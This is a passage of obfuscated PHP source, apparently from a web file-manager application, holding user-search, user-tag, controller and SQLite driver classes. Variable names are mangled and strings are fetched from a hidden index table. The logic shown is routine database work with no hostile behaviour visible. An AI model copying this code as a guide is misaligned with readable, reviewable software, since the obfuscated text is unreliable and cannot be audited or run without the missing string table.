$ïæßÙ‘[$Î½åÁÆÖ[795]] = $ø¨”Åİº[$Î½åÁÆÖ[795]]; } $ïæßÙ‘ = $this->parseWhereLike($ïæßÙ‘); $¡ç†€ùŒ = $this->_makeOrder()->where($ïæßÙ‘)->selectPage(20); if (!$¡ç†€ùŒ || count($¡ç†€ùŒ[$Î½åÁÆÖ[415]]) < 5 && Input::check($‰ÄÂãóÄ, $Î½åÁÆÖ[364])) { $ÛëÛ°Å” = $this->_searchFromMeta($Î½åÁÆÖ[507], $‰ÄÂãóÄ, 10); $áàÒı¶  = $this->_searchFromMeta($Î½åÁÆÖ[508], $‰ÄÂãóÄ, 10); $Ó§èÇìÙ = array_merge($ÛëÛ°Å”, $áàÒı¶ , $¡ç†€ùŒ[$Î½åÁÆÖ[415]]); $¡ç†€ùŒ[$Î½åÁÆÖ[415]] = array_unique_by_key($Ó§èÇìÙ, $Î½åÁÆÖ[1705]); $¡ç†€ùŒ[$Î½åÁÆÖ[412]][$Î½åÁÆÖ[413]] = count($¡ç†€ùŒ[$Î½åÁÆÖ[415]]); $¡ç†€ùŒ[$Î½åÁÆÖ[412]][$Î½åÁÆÖ[414]] = ceil($¡ç†€ùŒ[$Î½åÁÆÖ[412]][$Î½åÁÆÖ[413]] / $¡ç†€ùŒ[$Î½åÁÆÖ[412]][$Î½åÁÆÖ[409]]); } $this->_listDataApply($¡ç†€ùŒ[$Î½åÁÆÖ[415]]); $this->_filterByGroup($¡ç†€ùŒ, $’±¡ôëá); return $¡ç†€ùŒ; } private function _filterByGroup(&$ªÁ¢Ñ’´, $´»Ÿ’Ï®) { $îÒÈò¦¶ =& $_SERVER[•Ùç É]; if (!$´»Ÿ’Ï®) { return $ªÁ¢Ñ’´; } foreach ($ªÁ¢Ñ’´[$îÒÈò¦¶[415]] as $ö–ÃÙò => &$õ£½¦Ó’) { $†Êãœ = array_to_keyvalue($õ£½¦Ó’[$îÒÈò¦¶[2091]], $îÒÈò¦¶[12], $îÒÈò¦¶[1904]); if (!in_array($´»Ÿ’Ï®, $†Êãœ)) { unset($ªÁ¢Ñ’´[$îÒÈò¦¶[415]][$ö–ÃÙò]); } } unset($õ£½¦Ó’); $ªÁ¢Ñ’´[$îÒÈò¦¶[415]] = array_values($ªÁ¢Ñ’´[$îÒÈò¦¶[415]]); $ªÁ¢Ñ’´[$îÒÈò¦¶[412]] = array($îÒÈò¦¶[2157] => count($ªÁ¢Ñ’´[$îÒÈò¦¶[415]]), $îÒÈò¦¶[2155] => $ªÁ¢Ñ’´[$îÒÈò¦¶[412]][$îÒÈò¦¶[409]], $îÒÈò¦¶[2154] => 1, $îÒÈò¦¶[2156] => 1); } private function _searchFromMeta($²ùÃÉıî, $å›ş£, $ÄÛÈÊØ’) { $ƒüúïÕÇ =& $_SERVER[•Ùç É]; $å›ş£ = strtolower($å›ş£); $›äŒ€Ğ = array($ƒüúïÕÇ[96] => $²ùÃÉıî, $ƒüúïÕÇ[420] => array($ƒüúïÕÇ[429], "\45{$å›ş£}\45")); $›äŒ€Ğ = $this->parseWhereLike($›äŒ€Ğ); $àçÖÃƒ = Model($ƒüúïÕÇ[2399])->where($›äŒ€Ğ)->limit($ÄÛÈÊØ’)->select(); if (!$àçÖÃƒ) { return array(); } $àçÖÃƒ = array_to_keyvalue($àçÖÃƒ, $ƒüúïÕÇ[12], $ƒüúïÕÇ[1705]); $»Ÿ‰ü‚õ = $this->where(array($ƒüúïÕÇ[1696] => array($ƒüúïÕÇ[7], $àçÖÃƒ)))->select(); if (!$»Ÿ‰ü‚õ) { return array(); } return $»Ÿ‰ü‚õ; } private function _listDataApplyItem($É‚¨‹†¾) { $ÎÑË“şƒ = array($É‚¨‹†¾); $this->_listDataApply($ÎÑË“şƒ); return $ÎÑË“şƒ[0]; } private function _listDataApply(&$Ã©äµÄ€) { $à‹ñ· =& $_SERVER[•Ùç É]; if (!$Ã©äµÄ€) { return; } array_remove_key($Ã©äµÄ€, $à‹ñ·[940]); $—ŞˆÄ† = array_to_keyvalue($Ã©äµÄ€, $à‹ñ·[12], $à‹ñ·[1705]); $this->_listAppendGroup($Ã©äµÄ€, $—ŞˆÄ†); $this->_listAppendMeta($Ã©äµÄ€, $—ŞˆÄ†); $this->_listAppendSourceRoot($Ã©äµÄ€, $—ŞˆÄ†); } private function _listAppendSourceRoot(&$ÓÇ•Æ¬™, $Í²ò‹¹) { $½³Š×Ë =& $_SERVER[•Ùç É]; $œ«ı¢Ñ‚ = Model($½³Š×Ë[870])->listSourceRoot(SourceModel::TYPE_USER, $Í²ò‹¹); $œ«ı¢Ñ‚ = array_to_keyvalue($œ«ı¢Ñ‚, $½³Š×Ë[540]); $œ«ı¢Ñ‚ = array_remove_key($œ«ı¢Ñ‚, $½³Š×Ë[540]); foreach ($ÓÇ•Æ¬™ as &$áó†Ùùù) { $áó†Ùùù[$½³Š×Ë[89]] = $œ«ı¢Ñ‚[$áó†Ùùù[$½³Š×Ë[1705]]] ? $œ«ı¢Ñ‚[$áó†Ùùù[$½³Š×Ë[1705]]] : array(); } unset($áó†Ùùù); } private function _listAppendGroup(&$Îœğ¹£å, $ÈÈîÓö) { $„µ¨§ãİ =& $_SERVER[•Ùç É]; $ô£º‹Ü¯ = array($„µ¨§ãİ[1705] => array($„µ¨§ãİ[7], $ÈÈîÓö)); $‹³Š¥º¥ = Model($„µ¨§ãİ[1994])->where($ô£º‹Ü¯)->select(); $á¾ãƒı = array_to_keyvalue($‹³Š¥º¥, $„µ¨§ãİ[12], $„µ¨§ãİ[1904]); $á¾ãƒı = array_remove_value(array_unique($á¾ãƒı), $„µ¨§ãİ[214]); if (!$á¾ãƒı || !$‹³Š¥º¥) { return; } $ô£º‹Ü¯ = array($„µ¨§ãİ[1904] => array($„µ¨§ãİ[7], $á¾ãƒı)); $Üî½Ñíø = Model($„µ¨§ãİ[2089])->field($„µ¨§ãİ[2400])->where($ô£º‹Ü¯)->select(); $Üî½Ñíø = array_to_keyvalue($Üî½Ñíø, $„µ¨§ãİ[1904]); $‹³Š¥º¥ = array_to_keyvalue_group($‹³Š¥º¥, $„µ¨§ãİ[1705]); foreach ($‹³Š¥º¥ as &$í²á§Ãİ) { $ØáŠˆŠ¢ = array(); foreach ($í²á§Ãİ as $Û†‹ ÂÀ) { if (!$Û†‹ ÂÀ[$„µ¨§ãİ[2008]]) { continue; } $¦Ô×º–ö = Model($„µ¨§ãİ[542])->listData($Û†‹ ÂÀ[$„µ¨§ãİ[2008]]); $ØáŠˆŠ¢[] = array($„µ¨§ãİ[1904] => $Û†‹ ÂÀ[$„µ¨§ãİ[1904]], $„µ¨§ãİ[2401] => $Üî½Ñíø[$Û†‹ ÂÀ[$„µ¨§ãİ[1904]]][$„µ¨§ãİ[32]], $„µ¨§ãİ[555] => $Üî½Ñíø[$Û†‹ ÂÀ[$„µ¨§ãİ[1904]]][$„µ¨§ãİ[555]], $„µ¨§ãİ[457] => $¦Ô×º–ö); } $í²á§Ãİ = $ØáŠˆŠ¢; } unset($í²á§Ãİ); foreach ($Îœğ¹£å as &$‡¼ìé¼ì) { $‡¼ìé¼ì[$„µ¨§ãİ[2091]] = array(); if (isset($‹³Š¥º¥[$‡¼ìé¼ì[$„µ¨§ãİ[1705]]])) { $‡¼ìé¼ì[$„µ¨§ãİ[2091]] = $‹³Š¥º¥[$‡¼ìé¼ì[$„µ¨§ãİ[1705]]]; } } unset($‡¼ìé¼ì); } public function userAppendGroup($ÉÎŞˆòÀ) { $Š®Ãœà¢ =& $_SERVER[•Ùç É]; if (!$ÉÎŞˆòÀ) { return array(); } $this->_listAppendGroup($ÉÎŞˆòÀ, array_to_keyvalue($ÉÎŞˆòÀ, $Š®Ãœà¢[12], $Š®Ãœà¢[1705])); return $ÉÎŞˆòÀ; } private function _listAppendMeta(&$ÁÓ“²Ö¹, $’ ¡œ•Æ) { $¨Èº•Îö =& $_SERVER[•Ùç É]; $”ß‡ƒ¹Œ = UserJobModel::JOB_KEY; $¬óè¼ñ  = array($¨Èº•Îö[2380]); $ıöÃºœä = array($¨Èº•Îö[1705] => array($¨Èº•Îö[7], $’ ¡œ•Æ)); $Æ×Ğ€‹ = Model($¨Èº•Îö[2378])->where($ıöÃºœä)->select(); $Æ×Ğ€‹ = array_to_keyvalue_group($Æ×Ğ€‹, $¨Èº•Îö[1705]); foreach ($Æ×Ğ€‹ as &$ñªºä·õ) { $üµ¹Ò¯ = array(); foreach ($ñªºä·õ as $îİç“àĞ) { if (!in_array($îİç“àĞ[$¨Èº•Îö[96]], $¬óè¼ñ )) { $üµ¹Ò¯[$îİç“àĞ[$¨Èº•Îö[96]]] = $îİç“àĞ[$¨Èº•Îö[420]]; } } $ñªºä·õ = $üµ¹Ò¯; } unset($ñªºä·õ); $×Ç™íÔŞ = Model($¨Èº•Îö[2402]); foreach ($ÁÓ“²Ö¹ as &$´ŞÏÑÍç) { $ú£ß ½ü = array(); if (isset($Æ×Ğ€‹[$´ŞÏÑÍç[$¨Èº•Îö[1705]]])) { $ú£ß ½ü = $Æ×Ğ€‹[$´ŞÏÑÍç[$¨Èº•Îö[1705]]]; } $´ŞÏÑÍç[$¨Èº•Îö[2403]] = array(); if (isset($ú£ß ½ü[$”ß‡ƒ¹Œ])) { $´ŞÏÑÍç[$¨Èº•Îö[2403]] = $×Ç™íÔŞ->getUserJobInfo($ú£ß ½ü[$”ß‡ƒ¹Œ]); } } unset($´ŞÏÑÍç); } protected function groupUserAll($©•ÊÇ¦Ó) { $ŠÖ¡´¿Í =& $_SERVER[•Ùç É]; if (!$©•ÊÇ¦Ó) { return !1; } $÷Õğúæœ = Model($ŠÖ¡´¿Í[1994])->field($ŠÖ¡´¿Í[1705])->where(array($ŠÖ¡´¿Í[1904] => array($ŠÖ¡´¿Í[7], $©•ÊÇ¦Ó)))->select(); $÷Õğúæœ = array_to_keyvalue($÷Õğúæœ, $ŠÖ¡´¿Í[12], $ŠÖ¡´¿Í[1705]); return array_unique($÷Õğúæœ); } public function userSearch($´ò¼éüÖ, $åÇ¢ô” = "\x2a") { return Model($_SERVER[•Ùç É][569])->where($´ò¼éüÖ)->field($åÇ¢ô”)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\x6f\x70\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($±èÒİ—Ä) { $ÃøÄÌ‚ =& $_SERVER[•Ùç É]; $©ù‹¨Ìß = defined($ÃøÄÌ‚[2126]) && USER_ID ? USER_ID : $ÃøÄÌ‚[12]; return "\125\163\145\162\117\160\x74\151\157\x6e\137{$±èÒİ—Ä}\x5f" . $©ù‹¨Ìß; } protected function filterWhere($®Ü²) { $­­ÅñÖê =& $_SERVER[•Ùç É]; $®Ü²[$­­ÅñÖê[1705]] = defined($­­ÅñÖê[2126]) && USER_ID ? USER_ID : $­­ÅñÖê[12]; return $®Ü²; } public function cacheRemoveUser($»¨ß­ÄÀ, $ÕšÃÑƒ) { return Cache::remove("\125\163\145\162\x4f\x70\x74\x69\157\x6e\137{$»¨ß­ÄÀ}\x5f" . $ÕšÃÑƒ); } protected function optionDefault($„°ı¿ã“ = '') { $ßòóÂ¶ =& $_SERVER[•Ùç É]; if ($„°ı¿ã“ == $ßòóÂ¶[12]) { return $GLOBALS[$ßòóÂ¶[6]][$ßòóÂ¶[2404]]; } if ($„°ı¿ã“ == $ßòóÂ¶[2405]) { return $GLOBALS[$ßòóÂ¶[6]][$ßòóÂ¶[2406]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\141\x67\114\x69\x73\164"; public $modelType = "\x55\x73\x65\162\117\160\x74\x69\157\156"; public $field = array("\156\141\x6d\x65", "\x73\164\x79\x6c\x65", "\x73\x6f\162\x74"); public function listData($‚Ôºğàè = false, $ª°Ÿ¼æƒ = "\x73\157\x72\x74", $¯€¾»üµ = false) { return parent::listData($‚Ôºğàè, $ª°Ÿ¼æƒ, $¯€¾»üµ); } public function remove($úÏŸì‹) { return parent::remove($úÏŸì‹); } public function add($‹–ëô›•, $˜¬úïÂ‰ = "\x6c\141\x62\x65\154\x2d\147\x72\145\x79\55\x6e\157\162\x6d\141\x6c") { $Ú†Äˆª =& $_SERVER[•Ùç É]; if ($this->findByName($‹–ëô›•)) { return !1; } $•µñÈ = array($Ú†Äˆª[464] => $‹–ëô›•, $Ú†Äˆª[529] => $˜¬úïÂ‰, $Ú†Äˆª[1908] => $this->getSort($Ú†Äˆª[304]) + 1); return parent::insert($•µñÈ); } public function update($ôâ¦™ŞÍ, $¸áà¶ò) { $ôŞ¹¿¨ =& $_SERVER[•Ùç É]; $Û±£¥æó = $this->listData($ôâ¦™ŞÍ); $€ÉÓÑÎ = $this->findByName($¸áà¶ò[$ôŞ¹¿¨[32]]); if (!$Û±£¥æó || $€ÉÓÑÎ && $€ÉÓÑÎ[$ôŞ¹¿¨[445]] != $Û±£¥æó[$ôŞ¹¿¨[445]]) { return !1; } return parent::update($ôâ¦™ŞÍ, $¸áà¶ò); } public function moveTop($çÉ®¤¢) { $É–½õˆæ =& $_SERVER[•Ùç É]; $è±ª¤«á = parent::listData(); $šÆ²±¢ü = $this->getSort($É–½õˆæ[303]); foreach ($è±ª¤«á as &$±Ñ—˜ÏÜ) { if ($±Ñ—˜ÏÜ[$É–½õˆæ[445]] == $çÉ®¤¢) { $±Ñ—˜ÏÜ[$É–½õˆæ[1928]] = $šÆ²±¢ü; continue; } $±Ñ—˜ÏÜ[$É–½õˆæ[1928]] += 1; } unset($±Ñ—˜ÏÜ); return parent::resetData($è±ª¤«á); } public function moveBottom($£ÃÈ•»À) { $„ó†á†ñ =& $_SERVER[•Ùç É]; $£šà¼Ô‘ = $this->getSort($„ó†á†ñ[304]) + 1; return parent::update($£ÃÈ•»À, array($„ó†á†ñ[1928] => $£šà¼Ô‘)); } public function resetSort($ŠÒ¿é•è) { $­´Òœ¶” =& $_SERVER[•Ùç É]; $îŠÎ½á» = array(); $ŠÒ¿é•è = is_array($ŠÒ¿é•è) ? $ŠÒ¿é•è : array(); for ($¸âãúî = 0; $¸âãúî < count($ŠÒ¿é•è); $¸âãúî++) { $îŠÎ½á»[$ŠÒ¿é•è[$¸âãúî] . $­´Òœ¶”[12]] = $¸âãúî + 1; } $çáÇãîŸ = parent::listData(); foreach ($çáÇãîŸ as &$·­Õö¼) { $ç›×•÷É = $îŠÎ½á»[$·­Õö¼[$­´Òœ¶”[445]]]; $·­Õö¼[$­´Òœ¶”[1928]] = $ç›×•÷É ? $ç›×•÷É : $·­Õö¼[$­´Òœ¶”[1928]]; } unset($·­Õö¼); return parent::resetData($çáÇãîŸ); } private function getSort($¯„×Æ¦Ä) { $óĞáèˆ =& $_SERVER[•Ùç É]; $²Ã¤õ…‰ = parent::listData(); $ôñ‘å’å = array_to_keyvalue($²Ã¤õ…‰, $óĞáèˆ[12], $óĞáèˆ[1928]); if (!$ôñ‘å’å) { $ôñ‘å’å = array(0); } $À°È‡© = $¯„×Æ¦Ä == $óĞáèˆ[304] ? max($ôñ‘å’å) : min($ôñ‘å’å); return intval($À°È‡©); } } goto F¶—‡İŸ; d…•’¤†Óƒ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $“Äšû÷ =& $_SERVER[•Ùç É]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$“Äšû÷[6]] =& $config; $this->values[$“Äšû÷[7]] =& $in; $this->tpl = TEMPLATE . MOD . $“Äšû÷[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ö†¿Ò) { if (1 === func_num_args()) { $this->{$Ö†¿Ò} = new $Ö†¿Ò(); } else { $ó¶°·• = new ReflectionClass($Ö†¿Ò); $“Ä©Æû… = func_get_args(); array_shift($“Ä©Æû…); $this->{$Ö†¿Ò} = $ó¶°·•->newInstanceArgs($“Ä©Æû…); } return $this->{$Ö†¿Ò}; } public function routeBind($Î°•üüÎ, $íŠ¦¿¾Ä, $“û–“ = 3) { $å¹ÅÂÃä =& $_SERVER[•Ùç É]; $“İôœïä = $this->in[$å¹ÅÂÃä[9]]; $Î°•üüÎ = str_replace($å¹ÅÂÃä[10], $å¹ÅÂÃä[11], trim(trim($Î°•üüÎ, $å¹ÅÂÃä[8]), $å¹ÅÂÃä[12])); if (!$Î°•üüÎ || count($“İôœïä) <= $“û–“) { return !1; } $æëø¢›Ì = !0; $ÆâÒ¸¯ = explode($å¹ÅÂÃä[8], $Î°•üüÎ); for ($ıÚË¨ìº = 0; $ıÚË¨ìº < count($ÆâÒ¸¯); $ıÚË¨ìº++) { if ($ÆâÒ¸¯[$ıÚË¨ìº] != $“İôœïä[$“û–“ + $ıÚË¨ìº]) { $æëø¢›Ì = !1; break; } } if (!$æëø¢›Ì) { return; } call_user_func_array(array($this, $íŠ¦¿¾Ä), array()); } public function routeArgs($‚ëÇÄŞ½ = 3) { $¹ÊÛÕ‰á = $this->in[$_SERVER[•Ùç É][9]]; if (count($¹ÊÛÕ‰á) <= $‚ëÇÄŞ½) { return array(); } $ü¸À€•ô = array(); for ($šíöÀä¹ = $‚ëÇÄŞ½; $šíöÀä¹ < count($¹ÊÛÕ‰á); $šíöÀä¹ += 2) { $ü¸À€•ô[$¹ÊÛÕ‰á[$šíöÀä¹]] = $¹ÊÛÕ‰á[$šíöÀä¹ + 1]; $this->in[$¹ÊÛÕ‰á[$šíöÀä¹]] = $¹ÊÛÕ‰á[$šíöÀä¹ + 1]; } return $ü¸À€•ô; } protected function assign($Ï¯”«®Ÿ, $‰ÎÉØ·) { $this->values[$Ï¯”«®Ÿ] = $‰ÎÉØ·; } protected function display($ÖÎï“üÈ) { ob_end_clean(); extract($this->values); require $this->tpl . $ÖÎï“üÈ; } } class DbSqliteBase extends Db { public function __construct($÷ş¬êğ = '') { $ŠºîÅ€æ =& $_SERVER[•Ùç É]; if (!extension_loaded($ŠºîÅ€æ[13])) { think_exception(think_lang($ŠºîÅ€æ[14]) . $ŠºîÅ€æ[15]); } if (!empty($÷ş¬êğ)) { if (!isset($÷ş¬êğ[$ŠºîÅ€æ[16]])) { $÷ş¬êğ[$ŠºîÅ€æ[16]] = 438; } $this->config = $÷ş¬êğ; if (empty($this->config[$ŠºîÅ€æ[17]])) { $this->config[$ŠºîÅ€æ[17]] = array(); } } } public function connect($ëÔäùú¸ = '', $–êç×î = 0) { $Í¤§Öıˆ =& $_SERVER[•Ùç É]; if (!isset($this->linkID[$–êç×î])) { if (empty($ëÔäùú¸)) { $ëÔäùú¸ = $this->config; } $¤ôŒ‘¶ã = !empty($ëÔäùú¸[$Í¤§Öıˆ[17]][$Í¤§Öıˆ[18]]) ? $ëÔäùú¸[$Í¤§Öıˆ[17]][$Í¤§Öıˆ[18]] : $this->pconnect; $í¹Â®ËÛ = $¤ôŒ‘¶ã ? $Í¤§Öıˆ[19] : $Í¤§Öıˆ[20]; $this->linkID[$–êç×î] = $í¹Â®ËÛ($ëÔäùú¸[$Í¤§Öıˆ[21]], $ëÔäùú¸[$Í¤§Öıˆ[16]]); if (!$this->linkID[$–êç×î]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$–êç×î], 30000); if (1 != think_config($Í¤§Öıˆ[22])) { unset($this->config); } } return $this->linkID[$–êç×î]; } public function free() { $this->queryID = null; } public function query($¯‰ÀâÅÍ) { $Ú’ùÈ =& $_SERVER[•Ùç É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯‰ÀâÅÍ; if ($this->queryID) { $this->free(); } think_action_status($Ú’ùÈ[23], 1); think_status($Ú’ùÈ[24]); $this->queryID = sqlite_query($this->_linkID, $¯‰ÀâÅÍ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $«¹ÂƒêŞ = $this->getAll(); return $«¹ÂƒêŞ; } } public function execute($Œò¦¸³Á) { $…°ÚùòÜ =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Œò¦¸³Á; if ($this->queryID) { $this->free(); } think_action_status($…°ÚùòÜ[25], 1); think_status($…°ÚùòÜ[24]); $ÆÅÈ’ˆ¾ = sqlite_exec($this->_linkID, $Œò¦¸³Á); $this->debug(); if (!1 === $ÆÅÈ’ˆ¾) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[•Ùç É][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¶Úš¾²º = sqlite_query($this->_linkID, $_SERVER[•Ùç É][27]); if (!$¶Úš¾²º) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Û‡£›î€ = sqlite_query($this->_linkID, $_SERVER[•Ùç É][28]); if (!$Û‡£›î€) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¯Å·òè = array(); if ($this->numRows > 0) { for ($†¿ÂŒ = 0; $†¿ÂŒ < $this->numRows; $†¿ÂŒ++) { $¯Å·òè[$†¿ÂŒ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¯Å·òè; } public function getFields($¡çè¬ˆ) { $ñ²² Ã =& $_SERVER[•Ùç É]; $šê²ñÓ½ = $this->query($ñ²² Ã[29] . $¡çè¬ˆ . $ñ²² Ã[30]); $ŒÓ´Úà· = array(); if ($šê²ñÓ½) { foreach ($šê²ñÓ½ as $„™şıºµ => $ÅÓ­í›Ÿ) { $ŒÓ´Úà·[$ÅÓ­í›Ÿ[$ñ²² Ã[31]]] = array($ñ²² Ã[32] => $ÅÓ­í›Ÿ[$ñ²² Ã[31]], $ñ²² Ã[33] => $ÅÓ­í›Ÿ[$ñ²² Ã[34]], $ñ²² Ã[35] => (bool) ($ÅÓ­í›Ÿ[$ñ²² Ã[36]] === $ñ²² Ã[12]), $ñ²² Ã[37] => $ÅÓ­í›Ÿ[$ñ²² Ã[38]], $ñ²² Ã[39] => strtolower($ÅÓ­í›Ÿ[$ñ²² Ã[40]]) == $ñ²² Ã[41], $ñ²² Ã[42] => strtolower($ÅÓ­í›Ÿ[$ñ²² Ã[43]]) == $ñ²² Ã[44]); } } return $ŒÓ´Úà·; } public function getTables($¡ÀªµƒÂ = '') { $òò°¾§Š =& $_SERVER[•Ùç É]; $ÀƒÍ—Ú = $this->query($òò°¾§Š[45] . $òò°¾§Š[46] . $òò°¾§Š[47]); $é·äïâ = array(); foreach ($ÀƒÍ—Ú as $¶öŠûÒï => $ÂÔ‚ğæÆ) { $é·äïâ[$¶öŠûÒï] = current($ÂÔ‚ğæÆ); } return $é·äïâ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Œı—ûéµ =& $_SERVER[•Ùç É]; $ØÑš§Ä½ = sqlite_last_error($this->_linkID); $this->error = $ØÑš§Ä½ . $Œı—ûéµ[4] . sqlite_error_string($ØÑš§Ä½); if ($Œı—ûéµ[12] != $this->queryStr) { $this->error .= LNG($Œı—ûéµ[48]) . $this->queryStr; } think_trace($this->error, $Œı—ûéµ[12], $Œı—ûéµ[49]); return $this->error; } public function escapeString($çú¿Ğ¦²) { return sqlite_escape_string($çú¿Ğ¦²); } public function parseLimit($ ëõŞñß) { $õ³¢“‚Õ =& $_SERVER[•Ùç É]; $éÓÌŸêè = $õ³¢“‚Õ[12]; if (!empty($ ëõŞñß)) { $ ëõŞñß = explode($õ³¢“‚Õ[50], $ ëõŞñß); if (count($ ëõŞñß) > 1) { $éÓÌŸêè .= $õ³¢“‚Õ[51] . $ ëõŞñß[1] . $õ³¢“‚Õ[52] . $ ëõŞñß[0] . $õ³¢“‚Õ[53]; } else { $éÓÌŸêè .= $õ³¢“‚Õ[51] . $ ëõŞñß[0] . $õ³¢“‚Õ[53]; } } return $éÓÌŸêè; } } class DbSqlite3Base extends Db { public function __construct($ä¬äÈ£ = '') { $Õè¤ëÖ¤ =& $_SERVER[•Ùç É]; if (!class_exists($Õè¤ëÖ¤[54])) { think_exception(think_lang($Õè¤ëÖ¤[14]) . $Õè¤ëÖ¤[55]); } if (!empty($ä¬äÈ£)) { if (!isset($ä¬äÈ£[$Õè¤ëÖ¤[16]])) { $ä¬äÈ£[$Õè¤ëÖ¤[16]] = 438; } $this->config = $ä¬äÈ£; if (empty($this->config[$Õè¤ëÖ¤[17]])) { $this->config[$Õè¤ëÖ¤[17]] = array(); } } } public function connect($ä¤·¬ = '', $§‡€›ìÕ = 0) { $­¨ÎëÙ’ =& $_SERVER[•Ùç É]; if (!isset($this->linkID[$§‡€›ìÕ])) { if (empty($ä¤·¬)) { $ä¤·¬ = $this->config; } $this->linkID[$§‡€›ìÕ] = new SQLite3($ä¤·¬[$­¨ÎëÙ’[21]]); if (!$this->linkID[$§‡€›ìÕ]) { think_exception($this->linkID[$§‡€›ìÕ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$§‡€›ìÕ]->busyTimeout(30000); if (1 != think_config($­¨ÎëÙ’[22])) { unset($this->config); } } return $this->linkID[$§‡€›ìÕ]; } public function free() { $this->queryID = null; } public function query($š¬‡•Æ) { $§âì›¥­ =& $_SERVER[•Ùç É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $š¬‡•Æ; if ($this->queryID) { $this->free(); } think_action_status($§âì›¥­[23], 1); think_status($§âì›¥­[24]); $this->queryID = $this->_linkID->query($š¬‡•Æ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $«˜÷™®É = $this->getAll(); $this->numRows = count($«˜÷™®É); return $«˜÷™®É; } } public function execute($öş”óÑï) { $À “×¨÷ =& $_SERVER[•Ùç É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $öş”óÑï; if ($this->queryID) { $this->free(); } think_action_status($À “×¨÷[25], 1); think_status($À “×¨÷[24]); $†‰ß¯›å = $this->_linkID->exec($öş”óÑï); $this->debug(); if (!1 === $†‰ß¯›å) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[•Ùç É][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $…‹éÛ×Ü = $this->_linkID->query($_SERVER[•Ùç É][27]); if (!$…‹éÛ×Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $µ°óÄú— = $this->_linkID->query($_SERVER[•Ùç É][28]); if (!$µ°óÄú—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ßÅ’›î = array(); while ($îØ½¨Ÿ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ßÅ’›î[] = $îØ½¨Ÿ; } $this->queryID->reset(); return $ßÅ’›î; } public function getFields($®ö§Øùô) { $úõÌÑÓ =& $_SERVER[•Ùç É]; $¬ò­¥âÚ = $this->query($úõÌÑÓ[29] . $®ö§Øùô . $úõÌÑÓ[30]); $†¼òõÀ‰ = array(); if ($¬ò­¥âÚ) { foreach ($¬ò­¥âÚ as $«İ­½®ú => $‡Šª—áÆ) { $†¼òõÀ‰[$‡Šª—áÆ[$úõÌÑÓ[32]]] = array($úõÌÑÓ[32] => $‡Šª—áÆ[$úõÌÑÓ[32]], $úõÌÑÓ[33] => $‡Šª—áÆ[$úõÌÑÓ[33]], $úõÌÑÓ[35] => (bool) ($‡Šª—áÆ[$úõÌÑÓ[35]] === $úõÌÑÓ[12]), $úõÌÑÓ[37] => $‡Šª—áÆ[$úõÌÑÓ[56]], $úõÌÑÓ[39] => (bool) $‡Šª—áÆ[$úõÌÑÓ[57]], $úõÌÑÓ[42] => (bool) $‡Šª—áÆ[$úõÌÑÓ[57]]); } } return $†¼òõÀ‰; } public function getTables($¡å´éª = '') { $«ŒõûØƒ =& $_SERVER[•Ùç É]; $¶Ä”¹Èİ = $this->query($«ŒõûØƒ[45] . $«ŒõûØƒ[46] . $«ŒõûØƒ[47]); $áğœÈò = array(); foreach ($¶Ä”¹Èİ as $ä‘Á¥¹´ => $Ò¡õşŒÕ) { $áğœÈò[$ä‘Á¥¹´] = current($Ò¡õşŒÕ); } return $áğœÈò; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ôÛäúˆÍ =& $_SERVER[•Ùç É]; $this->error = $this->_linkID->lastErrorMsg(); if ($ôÛäúˆÍ[12] != $this->queryStr) { $this->error .= LNG($ôÛäúˆÍ[48]) . $this->queryStr; } think_trace($this->error, $ôÛäúˆÍ[12], $ôÛäúˆÍ[49]); return $this->error; } public function escapeString($ÙäçéÍœ) { $ñç¬…úâ =& $_SERVER[•Ùç É]; if ($this->_linkID) { return $this->_linkID->escapeString($ÙäçéÍœ); } return str_ireplace($ñç¬…úâ[58], $ñç¬…úâ[59], $ÙäçéÍœ); } public function parseLimit($Ñ×–æÊØ) { $³¼×™ =& $_SERVER[•Ùç É]; $×Ÿ‡ÒÉ = $³¼×™[12]; if (!empty($Ñ×–æÊØ)) { $Ñ×–æÊØ = explode($³¼×™[50], $Ñ×–æÊØ); if (count($Ñ×–æÊØ) > 1) { $×Ÿ‡ÒÉ .= $³¼×™[51] . $Ñ×–æÊØ[1] . $³¼×™[52] . $Ñ×–æÊØ[0] . $³¼×™[53]; } else { 